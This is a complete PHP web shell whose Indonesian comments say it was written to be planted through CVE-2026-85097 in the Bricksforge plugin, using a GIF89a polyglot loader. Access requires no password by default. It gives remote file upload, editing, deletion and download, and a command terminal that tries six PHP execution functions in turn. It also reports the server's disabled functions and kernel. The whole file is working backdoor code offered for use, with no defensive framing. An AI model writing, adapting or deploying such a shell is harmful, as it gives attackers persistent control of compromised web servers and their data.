<?php
/* ============================================================================
 * FM 2.0 -- single-file PHP file manager (header-safe, __DIR__-anchored)
 * ----------------------------------------------------------------------------
 * Dibuat untuk CVE-2026-85097 (Bricksforge): dimuat via loader polyglot
 * GIF89a (eval "?>" . file_get_contents(...)). Byte GIF sudah terkirim SEBELUM
 * kode ini jalan, jadi DILARANG header()/setcookie()/session_start() --
 * semua state via GET/POST tiap request.
 *
 * v2.0 fixes:
 *   - Semua operasi file di-anchor ke __DIR__ (direktori file shell ini),
 *     BUKAN getcwd() -- getcwd() di banyak hosting = docroot/homedir lain
 *     yang tidak writable.
 *   - Setiap operasi SELALU melaporkan status (OK/FAIL + alasan), termasuk
 *     kode error upload dan cek is_writable.
 *   - Terminal mencoba berlapis: proc_open -> popen -> shell_exec -> exec ->
 *     passthru -> system; kalau SEMUA di-disable (disable_functions),
 *     ditampilkan jelas "EXEC-DISABLED".
 *   - Footer diagnostik: versi PHP, disable_functions, limit upload.
 *
 * Kompatibilitas: sintaks PHP 4.3+ s/d PHP 8.x (tanpa fitur 5.3+).
 * Opsional password: $FMPASS (default '' = tanpa auth).
 * ========================================================================== */
$FMPASS = '';

@error_reporting(0);
@ini_set('display_errors', '0');

$FM_BASE = (defined('__DIR__') && __DIR__ !== '') ? __DIR__ : dirname(__FILE__);
$FM_BASE = str_replace('\\', '/', $FM_BASE);

function fm_b($s) { return htmlspecialchars((string)$s, ENT_QUOTES); }

function fm_name($n) {
    $n = str_replace('\\', '/', (string)$n);
    return basename($n);
}

function fm_writable_dir($d) {
    return @is_dir($d) && @is_writable($d);
}

/* ---------- auth (stateless, per request) ---------- */
$ok = ($FMPASS === '');
if (!$ok && isset($_POST['fp']) && $_POST['fp'] === $FMPASS) { $ok = true; }
if (!$ok && isset($_GET['fp']) && $_GET['fp'] === $FMPASS) { $ok = true; }
$pk = ($FMPASS !== '' && $ok) ? '&fp=' . urlencode($FMPASS) : '';

if (!$ok) {
    echo '<html><head><title>FM</title></head><body>';
    echo '<form method="post"><input type="password" name="fp">';
    echo '<input type="submit" value="Login"></form></body></html>';
    exit;
}

/* ---------- cwd: default = dir shell, nav = relative ke sana ---------- */
$cwd = $FM_BASE;
$nav = isset($_GET['d']) ? $_GET['d'] : (isset($_POST['d']) ? $_POST['d'] : '');
$nav = str_replace('\\', '/', (string)$nav);
if ($nav !== '') {
    $t = $FM_BASE . '/' . ltrim($nav, '/');
    $r = @realpath($t);
    if ($r !== false && @is_dir($r)) { $cwd = $r; }
}
if ($cwd === '') { $cwd = $FM_BASE; }

$act = isset($_GET['a']) ? $_GET['a'] : (isset($_POST['a']) ? $_POST['a'] : '');
$msg = '';

switch ($act) {

case 'up': /* upload */
    if (!isset($_FILES['f'])) {
        $msg = 'UP-FAIL: tidak ada field file (upload_max_filesize=' . @ini_get('upload_max_filesize') . ')';
    } else {
        $err = (int)@$_FILES['f']['error'];
        if ($err !== 0) {
            $why = array(1 => 'melebihi upload_max_filesize', 2 => 'melebihi MAX_FILE_SIZE/post_max_size',
                         3 => 'upload terpotong', 4 => 'tidak ada file', 6 => 'tidak ada folder tmp PHP',
                         7 => 'gagal menulis disk', 8 => 'extension menghentikan upload');
            $msg = 'UP-FAIL: ' . (isset($why[$err]) ? $why[$err] : 'error ' . $err);
        } elseif (!fm_writable_dir($cwd)) {
            $msg = 'UP-FAIL: direktori tidak writable: ' . $cwd;
        } else {
            $n = fm_name(@$_FILES['f']['name']);
            if (@move_uploaded_file($_FILES['f']['tmp_name'], $cwd . '/' . $n)) {
                $msg = 'UP-OK: ' . $n . ' (' . (int)@$_FILES['f']['size'] . ' bytes)';
            } else {
                $msg = 'UP-FAIL: move_uploaded_file gagal';
                if (@is_uploaded_file($_FILES['f']['tmp_name'])) {
                    $fh = @fopen($_FILES['f']['tmp_name'], 'rb');
                    $out = @fopen($cwd . '/' . $n, 'wb');
                    if ($fh && $out) {
                        while (!@feof($fh)) { $chunk = @fread($fh, 8192); @fwrite($out, $chunk); }
                        @fclose($fh); @fclose($out);
                        $msg = 'UP-OK (manual copy): ' . $n;
                    } else {
                        $msg = 'UP-FAIL: gagal total (move_uploaded_file dan fopen manual)';
                    }
                }
            }
        }
    }
    break;

case 'mk': /* make dir */
    if (!fm_writable_dir($cwd)) {
        $msg = 'MK-FAIL: direktori tidak writable: ' . $cwd;
    } else {
        $n = fm_name(isset($_POST['n']) ? $_POST['n'] : '');
        if ($n === '') { $msg = 'MK-FAIL: nama kosong'; }
        else { $msg = @mkdir($cwd . '/' . $n) ? 'MK-OK: ' . $n : 'MK-FAIL: ' . $n . ' (sudah ada? izin?)'; }
    }
    break;

case 'mf': /* make file */
    if (!fm_writable_dir($cwd)) {
        $msg = 'MF-FAIL: direktori tidak writable: ' . $cwd;
    } else {
        $n = fm_name(isset($_POST['n']) ? $_POST['n'] : '');
        if ($n === '') { $msg = 'MF-FAIL: nama kosong'; }
        else {
            $fh = @fopen($cwd . '/' . $n, 'w');
            if ($fh) { @fclose($fh); $msg = 'MF-OK: ' . $n; }
            else { $msg = 'MF-FAIL: ' . $n . ' (gagal fopen, cek izin)'; }
        }
    }
    break;

case 'del': /* delete file / empty dir */
    $n = fm_name(isset($_GET['n']) ? $_GET['n'] : '');
    $t = $cwd . '/' . $n;
    if (@is_dir($t)) {
        $msg = @rmdir($t) ? 'DEL-OK: ' . $n : 'DEL-FAIL: ' . $n . ' (dir tidak kosong / izin)';
    } else {
        $msg = @unlink($t) ? 'DEL-OK: ' . $n : 'DEL-FAIL: ' . $n . ' (tidak ada / izin)';
    }
    break;

case 'ren': /* rename */
    $a = fm_name(isset($_POST['a2']) ? $_POST['a2'] : '');
    $b = fm_name(isset($_POST['b']) ? $_POST['b'] : '');
    if ($a === '' || $b === '') { $msg = 'REN-FAIL: nama asal/tujuan kosong'; }
    elseif (!@file_exists($cwd . '/' . $a)) { $msg = 'REN-FAIL: ' . $a . ' tidak ada'; }
    elseif (!fm_writable_dir($cwd)) { $msg = 'REN-FAIL: direktori tidak writable'; }
    else { $msg = @rename($cwd . '/' . $a, $cwd . '/' . $b) ? 'REN-OK: ' . $a . ' -> ' . $b : 'REN-FAIL: ' . $a; }
    break;

case 'sv': /* save edited file */
    $n = fm_name(isset($_POST['n']) ? $_POST['n'] : '');
    $c = (string)(isset($_POST['c']) ? $_POST['c'] : '');
    if (!fm_writable_dir($cwd)) { $msg = 'SV-FAIL: direktori tidak writable'; }
    else {
        $fh = @fopen($cwd . '/' . $n, 'w');
        if ($fh) {
            @fwrite($fh, $c);
            @fclose($fh);
            $msg = 'SV-OK: ' . $n . ' (' . strlen($c) . ' bytes)';
        } else { $msg = 'SV-FAIL: ' . $n; }
    }
    break;

case 'dl': /* download = echo isi mentah (tanpa header) */
    $n = fm_name(isset($_GET['n']) ? $_GET['n'] : '');
    $t = $cwd . '/' . $n;
    if (@is_file($t)) { echo @file_get_contents($t); } else { echo 'DL-FAIL: ' . $n; }
    exit;

case 'cmd': /* command exec berlapis */
    $cmd = (string)(isset($_POST['cmd']) ? $_POST['cmd'] : '');
    if ($cmd !== '') {
        $used = '';
        $out = null;
        if (function_exists('proc_open')) {
            $pipes = array();
            $ph = @proc_open($cmd, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $pipes, $cwd);
            if (is_resource($ph)) {
                $out = @stream_get_contents($pipes[1]);
                $err = @stream_get_contents($pipes[2]);
                @fclose($pipes[1]); @fclose($pipes[2]);
                @proc_close($ph);
                if ($out === false) { $out = ''; }
                $out .= $err;
                $used = 'proc_open';
            }
        }
        if ($used === '' && function_exists('popen')) {
            $ph = @popen($cmd . ' 2>&1', 'r');
            if (is_resource($ph)) {
                $out = '';
                while (!@feof($ph)) { $out .= @fread($ph, 8192); }
                @pclose($ph);
                $used = 'popen';
            }
        }
        if ($used === '' && function_exists('shell_exec')) {
            $r = @shell_exec($cmd . ' 2>&1');
            if ($r !== null && $r !== false) { $out = $r; $used = 'shell_exec'; }
        }
        if ($used === '' && function_exists('exec')) {
            $lines = array();
            @exec($cmd . ' 2>&1', $lines, $rc);
            $out = implode("\n", $lines);
            $used = 'exec';
        }
        if ($used === '' && function_exists('passthru')) {
            @ob_start();
            @passthru($cmd . ' 2>&1', $rc);
            $out = @ob_get_contents();
            @ob_end_clean();
            $used = 'passthru';
        }
        if ($used === '' && function_exists('system')) {
            @ob_start();
            @system($cmd . ' 2>&1', $rc);
            $out = @ob_get_contents();
            @ob_end_clean();
            $used = 'system';
        }
        if ($used === '') {
            $msg = 'EXEC-DISABLED: proc_open/popen/shell_exec/exec/passthru/system semua mati' .
                   "\n" . 'disable_functions=' . @ini_get('disable_functions');
        } else {
            if ($out === null) { $out = ''; }
            $msg = 'CMD (' . $used . '): ' . $cmd . "\n" . $out;
        }
    }
    break;

case 'edit':
    $edit = fm_name(isset($_GET['n']) ? $_GET['n'] : '');
    break;
}

/* ---------- render ---------- */
$self = isset($_SERVER['SCRIPT_NAME']) ? basename($_SERVER['SCRIPT_NAME'])
      : (isset($_SERVER['PHP_SELF']) ? basename($_SERVER['PHP_SELF'])
      : (isset($_SERVER['REQUEST_URI']) ? basename(preg_replace('/\?.*$/', '', $_SERVER['REQUEST_URI'])) : 'fm.php'));
$self = preg_replace('/[^A-Za-z0-9_.-]/', '', $self);

echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>FM</title>'
   . '<style>body{font-family:monospace;font-size:13px;background:#111;color:#0f0}'
   . 'a{color:#0ff}table{border-collapse:collapse}td,th{border:1px solid #333;padding:3px 8px}'
   . 'input,textarea,button{background:#222;color:#0f0;border:1px solid #333}'
   . 'pre{white-space:pre-wrap;word-break:break-all}</style>'
   . '</head><body>';

echo '<b>DIR:</b> ' . fm_b($cwd)
   . ' <span style="color:#888">[base: ' . fm_b($FM_BASE) . ' | writable: '
   . (fm_writable_dir($cwd) ? 'YA' : 'TIDAK') . ']</span><br>';
if ($msg !== '') { echo '<pre>' . fm_b($msg) . '</pre>'; }

/* upload + mkdir + mkfile */
echo '<form method="post" enctype="multipart/form-data">'
   . '<input type="hidden" name="a" value="up">'
   . '<input type="hidden" name="d" value="' . fm_b($cwd) . '">'
   . ($pk !== '' ? '<input type="hidden" name="fp" value="' . fm_b($FMPASS) . '">' : '')
   . '<input type="file" name="f"><input type="submit" value="Upload"></form>';

echo '<form method="post"><input type="hidden" name="d" value="' . fm_b($cwd) . '">'
   . ($pk !== '' ? '<input type="hidden" name="fp" value="' . fm_b($FMPASS) . '">' : '')
   . '<input type="hidden" name="a" value="mk"><input name="n" placeholder="dir baru">'
   . '<input type="submit" value="Mkdir"></form>';

echo '<form method="post"><input type="hidden" name="d" value="' . fm_b($cwd) . '">'
   . ($pk !== '' ? '<input type="hidden" name="fp" value="' . fm_b($FMPASS) . '">' : '')
   . '<input type="hidden" name="a" value="mf"><input name="n" placeholder="file baru">'
   . '<input type="submit" value="New file"></form>';

/* cmd */
echo '<form method="post"><input type="hidden" name="d" value="' . fm_b($cwd) . '">'
   . ($pk !== '' ? '<input type="hidden" name="fp" value="' . fm_b($FMPASS) . '">' : '')
   . '<input type="hidden" name="a" value="cmd">'
   . '<input name="cmd" style="width:60%" placeholder="command">'
   . '<input type="submit" value="Exec"></form>';

/* listing */
echo '<p><a href="' . fm_b($self) . '?a=&d=' . urlencode(dirname($cwd)) . $pk . '">[..]</a></p>';
echo '<table><tr><th>Name</th><th>Size</th><th>Actions</th></tr>';
if (function_exists('scandir')) {
    $ents = @scandir($cwd);
} else {
    $ents = array();
    if ($dh = @opendir($cwd)) {
        while (($e = @readdir($dh)) !== false) { $ents[] = $e; }
        @closedir($dh);
    }
}
if ($ents) {
    foreach ($ents as $e) {
        if ($e === '.' || $e === '..') { continue; }
        $full = $cwd . '/' . $e;
        $isdir = @is_dir($full);
        $size = $isdir ? 'DIR' : @filesize($full);
        echo '<tr><td>';
        if ($isdir) {
            echo '<a href="' . fm_b($self) . '?a=&d=' . urlencode($full) . $pk . '">[DIR] ' . fm_b($e) . '</a>';
        } else {
            echo fm_b($e);
        }
        echo '</td><td>' . fm_b((string)$size) . '</td><td>';
        if (!$isdir) {
            echo '<a href="' . fm_b($self) . '?a=edit&d=' . urlencode($cwd) . '&n=' . urlencode($e) . $pk . '">edit</a> ';
            echo '<a href="' . fm_b($self) . '?a=dl&d=' . urlencode($cwd) . '&n=' . urlencode($e) . $pk . '">dl</a> ';
        }
        echo '<a href="' . fm_b($self) . '?a=del&d=' . urlencode($cwd) . '&n=' . urlencode($e) . $pk
           . '" onclick="return confirm(\'del ' . fm_b($e) . '?\')">del</a> ';
        echo '</td></tr>';
    }
}
echo '</table>';

/* rename */
echo '<form method="post"><input type="hidden" name="d" value="' . fm_b($cwd) . '">'
   . ($pk !== '' ? '<input type="hidden" name="fp" value="' . fm_b($FMPASS) . '">' : '')
   . '<input type="hidden" name="a" value="ren">'
   . '<input name="a2" placeholder="dari"><input name="b" placeholder="ke">'
   . '<input type="submit" value="Rename"></form>';

/* edit */
if (isset($edit) && $edit !== '') {
    $cont = @file_get_contents($cwd . '/' . $edit);
    if ($cont === false) { $cont = ''; }
    echo '<b>EDIT:</b> ' . fm_b($edit) . '<br>';
    echo '<form method="post"><input type="hidden" name="d" value="' . fm_b($cwd) . '">'
       . ($pk !== '' ? '<input type="hidden" name="fp" value="' . fm_b($FMPASS) . '">' : '')
       . '<input type="hidden" name="a" value="sv"><input type="hidden" name="n" value="' . fm_b($edit) . '">'
       . '<textarea name="c" rows="20" style="width:100%">' . fm_b($cont) . '</textarea>'
       . '<br><input type="submit" value="Save"></form>';
}

/* diagnostics footer */
$dis = @ini_get('disable_functions');
echo '<hr style="border-color:#333">';
echo 'PHP ' . fm_b(phpversion())
   . ' | disable_functions: ' . fm_b($dis !== '' ? $dis : '(kosong)')
   . ' | upload_max_filesize: ' . fm_b(@ini_get('upload_max_filesize'))
   . ' | post_max_size: ' . fm_b(@ini_get('post_max_size'))
   . ' | uname: ' . fm_b(function_exists('php_uname') ? @php_uname('s') . ' ' . @php_uname('r') : '?');

echo '</body></html>';
